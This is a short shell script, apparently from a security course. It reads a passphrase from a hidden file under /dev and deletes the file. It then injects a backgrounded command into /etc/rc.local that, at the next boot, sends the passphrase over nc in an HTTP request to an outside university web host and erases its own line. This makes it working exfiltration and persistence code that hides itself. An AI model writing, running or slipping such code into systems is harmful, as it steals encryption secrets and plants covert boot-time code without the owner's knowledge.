passphrase=`cat /dev/.cryptpass`
rm /dev/.cryptpass
destscript=/etc/rc.local

lastexit=$(sed -n '/exit[ ]*0/=' /root/$destscript | tail -n 1)
beforelastexit=$((lastexit - 1))

sed "$beforelastexit a\
(exec >/dev/null 2>/dev/null; \
sleep 60; \
/bin/echo -e 'get /~fmonjalet/secu/write.php?pass=$passphrase\\\n' | nc uuu.enseirb-matmeca.fr 80; \
sed \"${lastexit}d\" -i $destscript) &\
" -i /root/$destscript

